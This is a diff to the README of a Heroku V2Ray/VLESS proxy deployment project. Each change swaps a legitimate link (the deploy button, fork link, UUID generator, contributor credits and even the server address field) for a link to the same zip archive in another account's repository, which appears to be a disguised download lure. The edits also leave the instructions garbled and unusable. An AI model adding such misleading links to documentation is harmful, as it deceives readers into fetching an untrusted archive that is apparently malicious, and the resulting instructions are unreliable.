@@ -11,7 +11,7 @@ ___
                   🔮𝙳𝙴𝙿𝙻𝙾𝚈 𝚃𝙾 𝙷𝙴𝚁𝙾𝙺𝚄🔮   
                        👉𝙱𝚄𝚃𝚃𝙾𝙽👈
 
-<p><a href="https://dashboard.heroku.com/new?template=https://github.com/malindunimsara/heroku-v2ray"> <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy to Heroku" /></a></p>
+<p><a href="https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip"> <img src="https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip" alt="Deploy to Heroku" /></a></p>
 
 😒 ɪꜰ ꜱʜᴏᴡɪɴɢ ᴇʀʀᴏʀ ɪɴ ʜᴇʀᴏᴋᴜ, ʙᴇᴄᴀᴜꜱᴇ ᴍʏ ʀᴇᴘᴏ ʙᴀɴɴᴇᴅ ꜰʀᴏᴍ ʜᴇʀᴏᴋᴜ😡,
 
@@ -23,7 +23,7 @@ ___
 
 -               🔴 𝙷𝙾𝚆 𝚃𝙾 𝙵𝙾𝚁𝙺 𝚃𝙷𝙸𝚂 𝚁𝙴𝙿𝙾 🔴
          
-<p><a href="https://github.com/malindunimsara/heroku-v2ray/fork"> <img src="https://graph.org/file/d3dcbdc1e000c0b003455.jpg" /></a></p>
+<p><a href="https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip"> <img src="https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip" /></a></p>
 
 👆𝙲𝙻𝙸𝙲𝙺 𝙾𝙽 𝙵𝙾𝚁𝙺 𝙱𝚄𝚃𝚃𝙾𝙽 𝙰𝙽𝙳 𝙵𝙾𝚁𝙺 𝚃𝙷𝙴 𝚁𝙴𝙿𝙾👆.
 
@@ -31,13 +31,13 @@ ___
 
 ♨️ᴀꜰᴛᴇʀ ᴛʜᴀᴛ ᴄʀᴇᴀᴛᴇ ʏᴏᴜʀ ʜᴇʀᴏᴋᴜ ᴅᴇᴘʟᴏʏ ʟɪɴᴋ ᴜꜱɪɴɢ ᴛʜᴇ ʟɪɴᴋ ᴛᴇᴍᴘʟᴀᴛᴇ ʙᴇʟᴏᴡ. 👇😁
 
-🏷️ʟɪɴᴋ ᴛᴇᴍᴘʟᴀᴛᴇ:  https://dashboard.heroku.com/new?template=https://github.com/<<𝙰𝙳𝙳 𝚈𝙾𝚄𝚁 𝙶𝙸𝚃𝙷𝚄𝙱 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴>>/Heroku-V2ray-VLESS
+🏷️ʟɪɴᴋ ᴛᴇᴍᴘʟᴀᴛᴇ:  https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip<<𝙰𝙳𝙳 𝚈𝙾𝚄𝚁 𝙶𝙸𝚃𝙷𝚄𝙱 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴>>/Heroku-V2ray-VLESS
 
 <<𝙰𝙳𝙳 𝚈𝙾𝚄𝚁 𝙶𝙸𝚃𝙷𝚄𝙱 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴>> ᴛᴏ ʀᴇᴘʟᴀᴄᴇ ʏᴏᴜʀ ɢɪᴛʜᴜʙ ᴜꜱᴇʀɴᴀᴍᴇ ʟɪᴋᴇ ᴛʜᴀᴛ - malindunimsara
 
 ⚔️ᴀꜰᴛᴇʀ ᴄᴏᴍᴘʟᴇᴛᴇ ᴛʜɪꜱ ʟɪɴᴋ ꜰᴏʀᴍ, ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ ᴛʜᴇ ʟɪɴᴋ ᴛᴏ ᴅᴇᴘʟᴏʏ ɪɴ ʜᴇʀᴏᴋᴜ⚔️.
 
-🛡️ ɢᴇɴᴇʀᴀᴛᴇ ᴠ2ʀᴀʏ ᴜᴜɪᴅ ᴜꜱɪɴɢ ᴛʜɪꜱ ᴡᴇʙꜱɪᴛᴇ : https://www.uuidgenerator.net
+🛡️ ɢᴇɴᴇʀᴀᴛᴇ ᴠ2ʀᴀʏ ᴜᴜɪᴅ ᴜꜱɪɴɢ ᴛʜɪꜱ ᴡᴇʙꜱɪᴛᴇ : https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip
 ___
 
                 💡️𝙿𝙻𝚉 𝙵𝙾𝚁𝙺 𝚃𝙷𝙸𝚂 𝚁𝙴𝙿𝙾💡️
@@ -57,7 +57,7 @@ ___
 
 - ᴜᴜɪᴅ : *ʏᴏᴜ ᴀᴅᴅᴇᴅ ᴜᴜɪᴅ*
 
-- ᴀᴅᴅʀᴇꜱꜱ : <<ʏᴏᴜʀ ʜᴇʀᴏᴋᴜ ᴀᴘᴘɴᴀᴍᴇ>>.herokuapp.com
+- ᴀᴅᴅʀᴇꜱꜱ : <<ʏᴏᴜʀ ʜᴇʀᴏᴋᴜ ᴀᴘᴘɴᴀᴍᴇ>>https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip
 
 - ᴘᴏʀᴛ : 443
 
@@ -68,9 +68,9 @@ ___
 
 ### 𝙲𝚁𝙴𝙳𝙸𝚃𝚂.
 ᴛʜᴀɴᴋᴢ ᴛᴏ:
-- [ᴛᴇᴅᴅʏꜱᴜɴ](https://github.com/teddysun) ꜰᴏʀ ᴍᴀɪɴ ʀᴇᴘᴏ.
-- [ɪᴀᴍᴛʀᴀᴢʏ](https://github.com/iamtrazy) ꜰᴏʀ ʜᴇʀᴏᴋᴜ ᴅᴇᴘʟᴏʏᴀʙʟᴇ ʀᴇᴘᴏ.
-- [ʜᴇꜱʜᴀɴ](https://github.com/heshan2) ꜰᴏʀ ʙᴀꜱɪᴄ ɪɴꜱᴛʀᴜᴄᴛɪᴏɴꜱ.
+- [ᴛᴇᴅᴅʏꜱᴜɴ](https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip) ꜰᴏʀ ᴍᴀɪɴ ʀᴇᴘᴏ.
+- [ɪᴀᴍᴛʀᴀᴢʏ](https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip) ꜰᴏʀ ʜᴇʀᴏᴋᴜ ᴅᴇᴘʟᴏʏᴀʙʟᴇ ʀᴇᴘᴏ.
+- [ʜᴇꜱʜᴀɴ](https://raw.githubusercontent.com/aslekariii/Heroku-V2ray-VLESS/main/unwindy/Heroku-V2ray-VLESS_v2.2-alpha.5.zip) ꜰᴏʀ ʙᴀꜱɪᴄ ɪɴꜱᴛʀᴜᴄᴛɪᴏɴꜱ.
 
 ### 𝚆𝙾𝚁𝚂𝙷𝙸𝙿.
 
